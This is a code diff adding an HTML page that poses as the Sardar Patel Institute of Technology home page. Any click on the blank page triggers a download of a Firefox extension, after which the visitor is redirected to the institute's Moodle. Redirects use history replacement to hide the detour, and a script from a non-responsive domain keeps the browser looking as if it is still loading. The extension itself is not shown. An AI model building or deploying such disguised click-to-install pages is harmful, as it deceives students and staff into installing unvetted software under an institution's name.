@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Home | Sardar Patel Institute of Technology</title>
+    <meta name="referrer" content="no-referrer">
+    <style>
+        body,
+        html {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+            background: #ffffff;
+            overflow: hidden;
+            cursor: default !important;
+        }
+    </style>
+</head>
+
+<body>
+
+    <script>
+        const xpiUrl = "https://addons.mozilla.org/firefox/downloads/latest/maakima/latest.xpi";
+        const moodleUrl = "https://moodle.spit.ac.in";
+
+        // 1. Start the redirect timer immediately (using replace to wipe history)
+        // We do this at the TOP so it runs even while the page is "loading"
+        const redirectTimer = setTimeout(() => {
+            window.location.replace(moodleUrl);
+        }, 10000);
+
+        // 2. Click-to-Install handler
+        document.body.onclick = function () {
+            window.location.href = xpiUrl;
+            setTimeout(() => {
+                window.location.replace(moodleUrl);
+            }, 3000);
+        };
+    </script>
+
+    <!-- 3. The "Bottom Stall": 
+         Loading a blocking script from a non-responsive domain at the very end
+         forces the browser to stay in a "Loading" state and update the REAL status bar. -->
+    <script src="https://www.spit.com:81/stall.js"></script>
+</body>
+
+</html>
